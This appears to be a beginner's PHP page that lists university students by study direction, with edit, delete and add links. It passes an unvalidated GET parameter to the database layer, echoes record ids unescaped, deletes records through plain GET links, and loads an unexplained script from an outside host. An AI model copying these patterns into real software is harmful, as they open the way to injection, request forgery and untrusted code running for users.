<!DOCTYPE html>
<?php 
  require_once 'header.php';
  require_once 'logic.php';
  $database = new Database($host, $user, $password, $dbname); // Создаем объект класса
  // Получаем идентификатор направления из GET-запроса
  $idDirection = $_GET['id_direction'];
  // Получаем студентов по выбранному направлению
  $students = $database->getList($idDirection);
?>
<html lang="ru">
  <body>

  <form action="StudentList.php" method="GET" style="margin-left: 200px;">   
           
            <table>   
            <tr>
            
            <th style="padding-right: 20px;">ID</th>
            <th style="padding-right: 20px;">Фотография</th>
            <th style="padding-right: 20px;">ФИО студента</th>
            <th style="padding-right: 20px;">Направление подготовки</th>
            <th style="padding-right: 20px;">Название группы</th>
            <th style="padding-right: 20px;">Год рождения</th>
            
            </tr>
            <tr>
            <?php foreach ($students as $row): ?>
            <tr>
            <td style="padding: 20px;"><?php echo htmlspecialchars($row['id']) ?></td>
            <td style="padding: 20px;"><img src="<?php echo htmlspecialchars($row['img_student']) ?>" width="120px" height="80px"></td>
            <td style="padding: 20px;"><?php echo htmlspecialchars($row['name_student']) ?></td>
            <td style="padding: 20px;"><?php echo htmlspecialchars($row['course_direction']) ?></td>
            <td style="padding: 20px;"><?php echo htmlspecialchars($row['name_group']) ?></td>
            <td style="padding: 20px;"><?php echo htmlspecialchars($row['year']) ?></td>
            <td>
                <a href="StudentEdit.php?id=<?php echo $row['id']; ?>">Изменить</a>
            </td>
            <td style="padding-left: 50px;">
                <a href="StudentDelete.php?id=<?php echo $row['id']; ?>">Удалить</a>
            </td>
        </tr>
            <?php endforeach; ?>
        
        </table>
        <a href="StudentAdd.php" style="margin-left: 600px;">Добавить</a>
</form>
<?php
  require_once 'footer.php';
?>
<script src="./Top navbar example · Bootstrap v5.1_files/bootstrap.bundle.min.js.загрузка" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
<script src="//volgu.ivsupport.ru/script.php?<?=time()?>"></script>
      
  

</body></html>